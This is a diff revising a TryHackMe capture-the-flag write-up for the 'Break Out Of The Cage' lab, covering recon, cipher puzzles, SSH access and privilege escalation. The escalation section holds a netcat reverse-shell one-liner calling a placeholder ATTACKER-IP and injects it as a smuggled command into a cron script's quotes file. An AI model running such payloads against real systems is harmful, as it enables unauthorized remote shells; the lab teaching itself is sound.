@@ -1,4 +1,4 @@
-# Break-Out-Of-Cage | Tryhackme | Walkthrough 
+# Break-Out-Of-Cage | Tryhackme | Writeup 
 
 | Category          | Details               |
 |-------------------|-----------------------|
@@ -10,11 +10,11 @@
 
 
 # Reconnaissance
-scan the machine for services and open ports
+Perform an Nmap scan to identify open ports and running services on the target.
 
 [Nmap Scan](../Try-Hack-Me/images/break-out-of-cage/nmap%20scan.png)
 
-nmap results show:
+The Nmap scan reveals the following open ports:
 | Port      | Service       |
 | --------- |---------------|
 | 21/tcp    | ftp           |
@@ -23,21 +23,21 @@ nmap results show:
 
 # Enumeration 
 
-Lets check, FTP allows anonymous login
+Let's check whether the FTP service permits anonymous login.
 
 [FTP login](../Try-Hack-Me/images/break-out-of-cage/ftp%20login.png)
 
-Got a file `dad_tasks`<br>
+Anonymous FTP access provides a file named `dad_tasks`.<br>
 ```
 UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
 ```
 
-encoded with `base64`, when decoded it results in an another jumbed text phrase<br>
+The contents are Base64-encoded. Decoding them produces another seemingly garbled block of text.<br>
 used [chiper Identifier](https://www.dcode.fr/cipher-identifier) to figure out the chiper used got a many suggestions. Let's keep these aside and drill into the webpage and find any key if possible. 
 
 [Webpage](../Try-Hack-Me/images/break-out-of-cage/webpage.png)
 
-A simple static page with all page links dead. Lets run gobuster and find any useful directories 
+The website appears to be a simple static page with no functional links. To uncover hidden content, perform directory enumeration with Gobuster.
 ```
 # Got the below directories 
 /images
@@ -46,18 +46,19 @@ A simple static page with all page links dead. Lets run gobuster and find any us
 /auditions
 ```
 
-Of all the directories `/auditions` has a corrupted audio file.<br>
-Checking the file we hear Nicholas Cage talking and a weird noise. After checking the noise in a [spectrogram](https://www.boxentriq.com/steganography/audio-spectrogram) we can see some text:
+Among the discovered directories, /auditions contains a corrupted audio file that warrants further analysis.<br>
+Playing the audio reveals dialogue from Nicolas Cage followed by unusual noise, suggesting the presence of hidden data.<br>
+Viewing the audio in a [spectrogram](https://www.boxentriq.com/steganography/audio-spectrogram) reveals hidden text embedded within the sound.
 
 [Auditions directory](../Try-Hack-Me/images/break-out-of-cage/auditions%20directory.png)
 
 [Audio Spectrogram](../Try-Hack-Me/images/break-out-of-cage/audio-file.png)
 
 ## cracking password
-After all the details collected <br>
-we have a key from the audio file and chiper, from the multiple options provided from chiper identifier `Vigenere Cipher` was the best match.
+Combining the clues gathered so far, we now have both a potential decryption key from the spectrogram and a likely cipher identified earlier. <br>
+Of the candidate ciphers suggested by Cipher Identifier, the `Vigenère cipher` proves to be the correct choice.
 
-using the word found in the spectogram we can dechiper the vigenere chiper and get the password for `weston`
+Using the keyword extracted from the spectrogram, decrypt the Vigenère ciphertext to recover Weston's SSH password.
 ```
 Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
 One. Revamp the website
@@ -71,17 +72,17 @@ In case I forget.... <password_here>
 
 # Initial Access
 
-ssh login 
+Log in to the target over SSH using the recovered credentials.
 [ssh login](../Try-Hack-Me/images/break-out-of-cage/ssh%20login.png)
 
-WE ARE IN!!
+Initial access is successfully obtained.
 
-After logging in, a random message keep appearing from cage annoying 😑.<br>
-Let's run `pspy64` and find all the cornjobs running 
+After logging in, recurring broadcast messages from Cage appear on the terminal, indicating that an automated task is running in the background.<br>
+Run pspy64 to monitor processes and identify scheduled cron jobs executing on the system.
 
 [pspy64 list](../Try-Hack-Me/images/break-out-of-cage/pspy64.png)
 
-Found a scripting runnning at `/opt/.dads_scripts/spread_the_quotes.py` 
+`pspy64` reveals a Python script executed periodically at `/opt/.dads_scripts/spread_the_quotes.py`
 ```
 #!/usr/bin/env python
 
@@ -95,13 +96,15 @@ os.system("wall " + quote)
 ```
 This Python script reads a list of `quotes` from the file `/opt/.dads_scripts/.files/.quotes` and randomly selects one of them using the random module.<br>
 It then uses the `wall` command to broadcast the selected quote as a message to all logged-in users on the system. The script executes the command through `os.system()`, which invokes a shell to run wall. <br>
-Because the quote is directly concatenated into the shell command without sanitization, the script is vulnerable to command injection if an attacker can modify the contents of the `.quotes` file.
+Because user-controlled input is concatenated directly into an `os.system()` call without sanitization, the script is vulnerable to command injection. By modifying the `.quotes` file, arbitrary commands can be executed with the privileges of the scheduled task.<br>
 
-let's create a reverse shell command and inject it into `.quotes` file.
+Exploit the command injection vulnerability by appending a reverse shell payload to the `.quotes` file.
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER-IP PORT >/tmp/f
 ```
-need to send the shell command into `.quotes` file.
+
+Append the payload to the .quotes file so it is executed the next time the scheduled script runs.
+
 ```
 echo "hello;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER-IP PORT >/tmp/f
 ```
@@ -111,15 +114,15 @@ Set up a listener on the attack box
 nc -lvnp 4444
 ```
 
-Wait for sometime, and walla shell into cage!!
+After the cron job executes, the reverse shell connects back to the listener, providing a shell as the `cage` user.
 
 [cage shell](../Try-Hack-Me/images/break-out-of-cage/cage%20login.png)
 
 # Privilege Escalation 
 
-Well the cage user gives us access to user flag at `/home/cage/Super_Duper_Checklist`
+Access as the `cage` user allows retrieval of the user flag from `/home/cage/Super_Duper_Checklist`.
 
-The folder email_backup had 3 emails, of which the third one was useful
+The email_backup directory contains three emails, with the third providing an important clue for privilege escalation.
 ```
 From - Cage@nationaltreasure.com
 To - Weston@nationaltreasure.com
@@ -143,17 +146,18 @@ Regards
 The Legend - Cage
 ```
 
-From the 3rd email, a string resembling ciphertext can be observed. The message also mentions that Cage's agent is obsessed with his `face`, which serves as a potential hint toward the decryption key. Based on this clue, the ciphertext can be decoded using the `Vigenère cipher` as it was the same method used to encode the previous password.
+The third email contains a ciphertext and hints that the sender's agent is "obsessed with his face." <br>
+The repeated emphasis on face serves as the keyword for decrypting the message using the `Vigenère cipher`, ultimately revealing the root password.
 
-It worked got root password!!
+Decrypting the message successfully reveals the root account password.
 
-The Root Flag is in an email in `/root/email_backup`
+After logging in as root, retrieve the final flag from the email stored in `/root/email_backup.`
 
 [USER FLAG](../Try-Hack-Me/images/break-out-of-cage/user%20flag.png)
 
 [ROOT FLAG](../Try-Hack-Me/images/break-out-of-cage/root%20flag.png)
 
 Root flag & User Flag found!<br>
-Hope this Walkthrough was fun, easy to follow and helpful to you.<br>
+Hope this Writeup was fun, easy to follow and helpful to you.<br>
 
 Happy Hacking ~!!!
